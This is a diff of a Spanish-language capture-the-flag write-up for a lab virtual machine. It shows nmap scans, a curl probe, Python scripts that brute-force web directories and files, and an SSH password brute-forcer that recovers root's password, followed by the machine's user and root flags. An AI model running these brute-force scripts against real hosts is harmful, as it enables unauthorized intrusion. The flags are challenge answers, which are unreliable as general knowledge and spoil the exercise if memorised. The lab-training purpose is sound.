@@ -1,4 +1,4 @@
-Buscamos puertos tcp activos.
+##Buscamos puertos tcp activos.
 
 sudo nmap -sS -sV -O -p- 192.168.56.102 -oN tcp                                                                                                               
 Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-05 15:24 -05
@@ -16,7 +16,7 @@ OS details: Linux 4.15 - 5.6
 Network Distance: 1 hop
 
 
-Buscamos puertos Udp activos
+##Buscamos puertos Udp activos
 
 sudo nmap -sUV -T4 -F --version-intensity 0 192.168.56.102 -oN udp                                                                                  
 Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-05 15:27 -05
@@ -29,7 +29,7 @@ MAC Address: 08:00:27:E5:E3:8F (Oracle VirtualBox virtual NIC)
 
 Tenemos los puertos 22 y 80 activos.
 
-Usamos Curl...
+##Usamos Curl...
 curl -v http://192.168.56.
 
 * Trying 192.168.56.102:80...
@@ -56,7 +56,7 @@ Dont Overthink. Really, Its simple.
 
 El Html nos dice poco excepto que no sobre-pensemos la solución.
 
-Buscamos directorios mediante fuerza bruta con Python y requests.
+##Buscamos directorios mediante fuerza bruta con Python y requests.
 
 ```python
 import requests
@@ -73,7 +73,7 @@ with open(payload, 'r') as file:
         if response.status_code == 200:
             print(f'[+] {url}  status-code [{response.status_code}]')
 ```
-Salida:
+###Salida:
 [+] http://192.168.56.102/  status-code [200]
 
 No encontramos ningún directorio sospechoso y procedemos a buscar archivos mediante el uso de la misma tecnica.
@@ -94,7 +94,7 @@ with open(payload, 'r') as file:
             if response.status_code == 200:
                 print(f'[+] {url}  status-code [{response.status_code}]')
 ```
-Salida:
+###Salida:
 [+] http://192.168.56.102/index.html  status-code [200]
 
 Solo encontramos un archivo.
@@ -121,7 +121,7 @@ with open(file, 'r') as payloads:
             print(f'[-] {username}: {payload[:-1]}')
             ssh.close()
 ```
-Salida:
+###Salida:
 .
 .
 .
@@ -134,8 +134,8 @@ Salida:
 [-] root: jackson
 [+] root: simple
 
-El password es 'simple' para el usuario 'root'
+##El password es 'simple' para el usuario 'root'
 
-id:uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) 
-Flag user:HMV665sXzDS
-Flag root:HMVtyr543FG
+>id:uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) 
+>Flag user:HMV665sXzDS
+>Flag root:HMVtyr543FG
